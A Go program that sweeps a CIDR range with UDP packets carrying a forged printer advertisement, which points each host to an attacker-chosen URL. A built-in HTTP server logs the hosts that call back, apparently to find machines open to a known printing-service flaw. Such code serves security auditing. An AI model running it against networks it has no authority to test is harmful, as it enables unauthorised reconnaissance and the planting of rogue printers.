package main

import (
	"flag"
	"fmt"
	"log"
	"net"
	"net/http"
	"strconv"
	"sync"
)

// Packet represents the UDP packet information
type Packet struct {
	Message  string
	DestIP   string
	DestPort int
}

// Function to generate IPs from a CIDR block
func generateIPs(cidr string) ([]string, error) {
	var ips []string
	ip, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		return nil, err
	}
	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {
		ips = append(ips, ip.String())
	}
	return ips, nil
}

// Function to increment the IP
func inc(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

// Function to send UDP packet
func sendPacket(packet Packet, wg *sync.WaitGroup) {
	defer wg.Done()

	// Prepare the UDP address
	address := net.JoinHostPort(packet.DestIP, strconv.Itoa(packet.DestPort))
	udpAddr, err := net.ResolveUDPAddr("udp", address)
	if err != nil {
		log.Printf("Failed to resolve address %s: %v\n", address, err)
		return
	}

	// Create a UDP connection
	conn, err := net.DialUDP("udp", nil, udpAddr)
	if err != nil {
		log.Printf("Failed to dial UDP address %s: %v\n", address, err)
		return
	}
	defer conn.Close()

	// Send the message
	_, err = conn.Write([]byte(packet.Message))
	if err != nil {
		log.Printf("Failed to send UDP packet to %s: %v\n", address, err)
	}
}

// Function to batch packets and send them concurrently using goroutines
func sendPacketsInBatches(packets []Packet, batchSize int) {
	var wg sync.WaitGroup

	// Send in batches
	for i := 0; i < len(packets); i += batchSize {
		end := i + batchSize
		if end > len(packets) {
			end = len(packets)
		}

		// Create a batch of packets
		batch := packets[i:end]
		for _, packet := range batch {
			wg.Add(1)
			go sendPacket(packet, &wg)
		}
		wg.Wait()
	}
}

// HTTP server to log incoming POST requests
func startHTTPServer(dport string) {
	http.HandleFunc("/printers/NAME", func(w http.ResponseWriter, r *http.Request) {
		if r.Method == "POST" {
			src := r.RemoteAddr
			log.Printf("Received POST request: %s\n", src)
		} else {
			w.WriteHeader(http.StatusMethodNotAllowed)
		}
	})

	// Start the HTTP server
	log.Printf("Starting HTTP server on port %s...", dport)
	if err := http.ListenAndServe(fmt.Sprintf(":%s", dport), nil); err != nil {
		log.Fatalf("HTTP server error: %v\n", err)
	}
}

func main() {
	// Command-line arguments
	ipPtr := flag.String("ip", "", "Target IP address")
	portPtr := flag.String("port", "0", "Target UDP port")
	destPtr := flag.String("dest", "", "Destination IP address")
	destPortPtr := flag.String("destport", "0", "Destination UDP port")
	cidrPtr := flag.String("cidr", "", "CIDR block for network scanning")
	flag.Parse()

	// Run HTTP server in a separate goroutine
	go startHTTPServer(*destPortPtr)

	// CIDR Handling
	var ips []string
	var err error
	if *cidrPtr != "" {
		ips, err = generateIPs(*cidrPtr)
		if err != nil {
			log.Fatalf("Failed to parse CIDR: %v\n", err)
		}
	} else {
		ips = append(ips, *ipPtr)
	}

	// Create packets for each IP in the CIDR
	var packets []Packet
	for _, ip := range ips {
		packet := Packet{
			Message:  fmt.Sprintf("%x %x %s %s %s", 0x00, 0x03, fmt.Sprintf("http://%s:%s/printers/NAME", *destPtr, *destPortPtr), "Office HQ", "Printer"),
			DestIP:   ip,
			DestPort: parsePort(*portPtr),
		}
		packets = append(packets, packet)
	}

	// Send UDP packets in batches
	batchSize := 10 // Example batch size, can be modified
	sendPacketsInBatches(packets, batchSize)

	//block the main goroutine to keep HTTP up
	select {}
}

// Helper function to parse port
func parsePort(portStr string) int {
	port, err := strconv.Atoi(portStr)
	if err != nil {
		log.Fatalf("Invalid port: %v\n", err)
	}
	return port
}
